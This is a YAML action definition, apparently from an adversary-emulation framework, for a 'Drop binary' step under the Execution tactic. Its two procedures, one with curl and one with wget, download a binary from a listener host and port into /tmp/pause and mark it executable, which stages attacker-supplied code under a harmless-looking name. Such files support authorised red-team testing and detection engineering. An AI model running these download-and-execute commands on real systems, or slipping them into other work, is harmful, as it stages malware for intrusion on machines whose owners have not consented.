name: Drop binary
description: Downloads a binary from the provided source to a system
tactic: Execution
techniques: ["User Execution"]
parameters:
  URL:
    type: string
    description: the url from where to download the binary
  DST_BIN:
    type: string
    description: the destination path of the binary at the remote system
args:
  URL: "${LISTENER}/${FILESHARE_PORT}"
  DST_BIN: "/tmp/pause"
procedures:
  - key: curl
    command: curl -sS -L ${URL} -o ${DST_BIN} && chmod +x ${DST_BIN} 
  - key: wget
    command: wget ${URL} -O ${DST_BIN} && chmod +x ${DST_BIN} 
preconditions:
  kind: System
  accessLevel: "user-exec"
effects: ["sys.has-binary(${DST_BIN})"]
